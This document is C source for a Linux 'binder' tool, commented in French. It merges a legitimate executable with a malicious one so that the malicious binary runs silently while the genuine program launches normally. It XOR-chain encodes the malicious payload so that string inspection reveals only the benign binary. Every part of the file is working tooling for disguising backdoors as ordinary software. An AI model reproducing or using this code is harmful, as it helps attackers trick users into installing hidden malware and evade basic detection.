/* LOTFREE Linux binder
 * Transform two executables into one auto-extract & launch binary
 * Evil binary gets executed silently, official binary is launched normally
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>

#define STUB "stub"
#define BUFFSIZE 512
/* Valeur utilisee pour l'encodage. Doit etre identique dans le stub */
#define MAGIC 'o'

int main(int argc,char *argv[])
{
  int out, in, i, len=0;
  unsigned int size1, size2 = 0;
  unsigned char buff[BUFFSIZE], x;
  struct stat mystat;

  if(argc != 3)
  {
    printf("Usage: %s <Good file> <Bad file>\n", argv[0]);
    return 1;
  }
  /* Le binaire ELF resultant sera nomme out.exe. A renommer comme bon vous semble */
  out = open("out.exe", O_WRONLY|O_CREAT|O_TRUNC, S_IRUSR|S_IWUSR|S_IXUSR);
  if(out == -1)
  {
    printf("erreur1\n");
    return 1;
  }

  /* On place d'abord notre "stub" qui se chargera d'extraire le programme officiel
   * et de l'executer. Le nom du binaire est ici hardcode a "stub". */
  in = open(STUB, O_RDONLY);
  if(in == -1)
  {
    printf("erreur\n");
    return 1;
  }
  while((len = read(in, buff, BUFFSIZE)) > 0)
  {
    write(out, buff, len);
  }
  close(in);

  /* On copie le bon fichier a la suite */
  in = open(argv[1], O_RDONLY);
  if(in == -1)
  {
    printf("erreur\n");
    return 1;
  }
  fstat(in,&mystat);
  size1 = mystat.st_size;
  printf("%u\n", size1);
  while((len = read(in, buff, BUFFSIZE)) > 0)
  {
    write(out,buff,len);
  }
  close(in);

  /* Suivi du mechant executable de votre choix (backdoor & co)
   * Ce binaire est encode (de facon triviale) pour passer inapercu
   * Ainsi un "strings" sur le fichier final renverra les chaines du bon
   * binaire mais pas celle de votre evil code :p */
  in = open(argv[2], O_RDONLY);
  if(in == -1)
  {
    printf("erreur\n");
    return 1;
  }
  fstat(in, &mystat);
  size2 = mystat.st_size;
  printf("%u\n", size2);

  /* get first char */
  read(in, buff, 1);
  x = MAGIC;
  lseek(in, 0, SEEK_SET);

  while((len = read(in, buff, BUFFSIZE)) > 0)
  {
    for(i = 0; i < len; i++)
    {
      buff[i] ^= x;
      x = buff[i];
    }
    write(out, buff, len);
  }
  close(in);

  /* A la fin du fichier on stocke les tailles respectives
   * du bon et du mauvais programme car le stub en a besoin
   * pour savoir comment extraire les fichiers */
  write(out, (int*)&size1, 4);
  write(out, (int*)&size2, 4);

  /* On place aussi une signature... Une simple verification
   * qui peut etre rectifiee */
  write(out, "LOTF", 4);
  close(out);
  return 0;
}

